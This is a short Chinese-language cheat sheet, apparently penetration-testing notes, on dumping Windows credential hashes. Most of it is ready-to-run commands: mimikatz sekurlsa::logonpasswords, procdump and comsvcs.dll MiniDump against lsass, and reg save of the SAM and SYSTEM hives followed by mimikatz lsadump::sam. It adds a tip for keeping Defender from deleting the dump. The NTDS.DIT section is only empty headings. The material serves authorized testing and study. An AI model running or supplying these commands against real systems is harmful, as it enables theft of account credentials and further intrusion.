# 转储HASH
---
* lsass
* SAM
* NTDS.DIT
## lsass
---
lsass进程在内存中保存了登录用户的信息,包括用户hash
### mimikatz
`sekurlsa::logonpasswords`
### Procdump
`procdump -accepteula -ma <processus>/<lsass pid> processus_dump.dmp`
* -ma 转储全部信息,默认只转储进行和句柄信息

指定lsass进程生成的dmp文件可能会被WDF删除,可以指定lsass.exe的pid替代

### comsvcs.dll
需要system权限
comsvcs.dll的MiniDumpW函数用于保存系统crash时的内存信息

`rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full`
## SAM
---
SAM数据库保存了本地所有用户的hash值  
磁盘副本:`%SystemRoot%/system32/config/SAM`  
注册表:`HKLM\SAM\SAM\Domains\Account\Users\`
### mimikatz
`lsadump::sam`
* system权限
### 直接导出
注册表直接导出,hklm\sam为用户加密后的数据,hklm\system为加密的密钥    
`reg save hklm\sam sam.hiv`  
`reg save hklm\system system.hiv`  
lsadump::sam /sam:Sam.hiv /system:System.hiv
* system权限
## NTDS.DIT
---
### Volume Shadow Copy
### NinjaCopy